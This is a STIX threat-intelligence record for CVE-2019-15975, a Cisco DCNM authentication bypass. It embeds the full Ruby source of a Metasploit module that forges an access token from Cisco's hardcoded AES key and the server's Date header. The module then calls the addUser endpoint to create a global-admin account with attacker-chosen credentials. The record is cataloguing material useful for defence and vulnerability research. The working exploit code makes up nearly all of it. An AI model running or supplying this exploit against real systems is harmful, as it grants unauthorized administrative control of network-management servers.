{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef9b9044-1697-4a06-b43b-0194837d9df5",
    "created": "2024-08-14T16:24:19.03028Z",
    "modified": "2024-08-14T16:24:19.030283Z",
    "name": "Cisco DCNM auth bypass",
    "description": " This exploit is able to add an admin account to a Cisco DCNM with credentials you can choose. After that, you can login to the web interface with those credentials. The only necessary condition is the more or less recent connection of an admin as this exploit uses a kind of session stealing.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/networking/cisco_dcnm_auth_bypass.rb",
            "external_id": "cisco_dcnm_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-15975"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'securerandom'\nrequire 'base64'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco DCNM auth bypass',\n        'Description' => %q{\n          This exploit is able to add an admin account to a Cisco DCNM with credentials you can choose.\n          After that, you can login to the web interface with those credentials.\n          The only necessary condition is the more or less recent connection of an admin as this exploit\n          uses a kind of session stealing.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'MR_ME', # Amazing POC on www.exploit-db.com\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2019-15975'],\n          [ 'EDB', '48018']\n        ],\n        'DisclosureDate' => '2020-06-01',\n        'DefaultOptions' => { 'SSL' => true },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptInt.new('RETRIES', [true, 'Retry count for the attack', 50]),\n      OptString.new('TARGETURI', [true, 'The base path of the Cisco DCNM', '/']),\n      OptString.new('USERNAME', [true, 'The username of the admin account you want to add', Faker::Internet.username(specifier: 8..10).gsub(/[^a-zA-Z0-9]/, '')]),\n      OptString.new('PASSWORD', [true, 'The password of the admin account you want to add', Faker::Internet.password(min_length: 8, max_length: 10)])\n    ])\n  end\n\n  KEY = 's91zEQmb305F!90a'.freeze\n\n  class AESCipher\n    def initialize\n      # Cisco's hardcoded key\n      @bs = 16\n    end\n\n    def encrypt(raw)\n      raw = _pad(raw)\n      iv = \"\\x00\" * 0x10\n      cipher = OpenSSL::Cipher.new('aes-128-cbc')\n      cipher.encrypt\n      cipher.key = KEY\n      cipher.iv = iv\n      Base64.encode64(cipher.update(raw))\n    end\n\n    private\n\n    def _pad(size)\n      size + (@bs - size.length % @bs).chr.to_s * (@bs - size.length % @bs)\n    end\n  end\n\n  def make_raw_token\n    key = 'what_a_nice_key'\n    uuid = SecureRandom.uuid.gsub('-', '')[0..20]\n    time = leak_time\n    raw_token = format('%<key>s-%<uuid>s-%<time>s', key: key, uuid: uuid, time: time)\n    raw_token\n  end\n\n  def bypass_auth(token, usr, pwd)\n    d = {\n      'userName' => usr,\n      'password' => pwd,\n      'roleName' => 'global-admin'\n    }\n    h = { 'afw-token' => token }\n\n    r = send_request_cgi({\n      'method' => 'POST',\n      'headers' => h,\n      'vars_post' => d,\n      'uri' => normalize_uri(target_uri.path, 'fm/fmrest/dbadmin/addUser')\n    })\n\n    if r && r.body != 'Access denied'\n\n      json = r.get_json_document\n\n      case json&.dig('resultMessage')\n      when 'Success'\n        return :success\n      when 'User already exists.'\n        return :user_already_exists\n      when 'Cannot add user since password strength check failed'\n        return :weak_password\n      end\n    else\n      return :failed_to_connect\n    end\n    :fail\n  end\n\n  def leak_time\n    r = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    fail_with(Failure::Unreachable, \"Target #{rhost} could not be reached.\") unless r\n\n    r_time = DateTime.strptime(r.headers['Date'][0..-4], '%a, %d %b %Y %H:%M:%S').strftime('%s')\n    r_time\n  end\n\n  def add_admin_account(usr, pwd)\n    res = -1\n\n    datastore['RETRIES'].times do\n      raw = make_raw_token\n\n      cryptor = AESCipher.new\n      token = cryptor.encrypt(raw).gsub(\"\\n\", '')\n      res = bypass_auth(token, usr, pwd)\n      if res != :fail && res != :failed_to_connect\n\n        return res\n      end\n    end\n    print_error(\"Didn't succeed after #{datastore['RETRIES']} attempts\")\n    res\n  end\n\n  def check\n    res = add_admin_account('test', 'test')\n\n    if res == :success || res == :user_already_exists || res == :weak_password\n      Exploit::CheckCode::Vulnerable\n    elsif res == :failed_to_connect\n      Exploit::CheckCode::Safe\n    else\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def run\n    res = add_admin_account(datastore['USERNAME'], datastore['PASSWORD'])\n    if res == :success\n      print_good(\"Admin account with username: '#{datastore['USERNAME']}' and password: '#{datastore['PASSWORD']}' added!\")\n    elsif res == :weak_password\n      print_error('Unable to add admin account due to bad password strength')\n    elsif res == :user_already_exists\n      print_error('Unable to add admin account because this username already exists')\n    else\n      print_error('Something went wrong')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-01"
}